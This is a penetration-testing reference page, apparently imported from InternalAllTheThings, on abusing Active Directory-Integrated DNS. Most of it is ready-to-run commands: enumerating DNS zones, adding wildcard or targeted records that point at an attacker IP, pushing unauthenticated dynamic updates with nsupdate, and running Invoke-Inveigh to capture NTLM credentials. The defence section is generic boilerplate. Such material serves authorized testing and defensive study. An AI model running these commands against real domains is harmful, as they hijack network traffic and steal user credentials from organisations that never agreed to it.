---
title: Active Directory - Integrated DNS - ADIDNS
type: technique
tags: [active-directory, adidns, dns, enumeration, reference-import, windows]
phase: enumeration
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Active Directory - Integrated DNS - ADIDNS

## What it is

ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic. Active Directory will need some time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol.

## How it works

ADIDNS zones allow any authenticated domain user to create new DNS records by default because the zone DACL grants `CreateChild` to all domain users. Attackers exploit this to register wildcard or targeted DNS records that redirect traffic to an attacker-controlled host for NTLM credential capture or man-in-the-middle attacks. The DNS records are written directly via LDAP and propagate to all domain-integrated DNS servers within approximately 180 seconds.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic. Active Directory will need some time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol.

## LDAP-Based (Require authentication)

* Enumerate all records

```ps1
adidnsdump -u DOMAIN\\user --print-zones dc.domain.corp (--dns-tcp)
# or
bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 get dnsDump
```

* Query a node

```ps1
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController (--legacy)
# or
bloodyAD -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'DC=DomainDnsZones,DC=bloody,DC=lab' --filter '(&(name=allmightyDC)(objectClass=dnsNode))' --attr dnsRecord
```

* Add a node and attach a record

```ps1
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
# or
bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 add dnsRecord dc1.example.lab <Attacker IP>

bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 remove dnsRecord dc1.example.lab <Attacker IP>
```

The common way to abuse ADIDNS is to set a wildcard record and then passively listen to the network.

```ps1
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```

## Dynamic Updates (Doesn't require authentication)

Dynamic DNS (RFC 2136) allows using the DNS protocol to update DNS records:

1. If the zone is set to Secure Only, you need a valid Kerberos ticket.

2. If the zone is set to Nonsecure and Secure, anyone on the network can send updates.

Update a record:

```ps1
# Linux
cat << EOF > dnsupdate.txt
server dc.domain.corp
zone domain.corp
update delete test.domain.corp A
update add test.domain.corp 3600 A 10.10.10.123
send
EOF

nsupdate dnsupdate.txt

# Windows
Invoke-DNSupdate -DNSType A -DNSName test -DNSData 192.168.125.100 -Verbose
```

## DNS Reconnaissance

Perform **ADIDNS** searches

```powershell
StandIn.exe --dns --limit 20
StandIn.exe --dns --filter SQL --limit 10
StandIn.exe --dns --forest --domain <domain> --user <username> --pass <password>
StandIn.exe --dns --legacy --domain <domain> --user <username> --pass <password>
```

## References

* [Getting in the Zone: dumping Active Directory DNS using adidnsdump - Dirk-jan Mollema](https://blog.fox-it.com/2019/04/25/getting-in-the-zone-dumping-active-directory-dns-using-adidnsdump/)
* [ADIDNS Revisited – WPAD, GQBL, and More - December 5, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/)
* [Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS - July 10, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[john]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
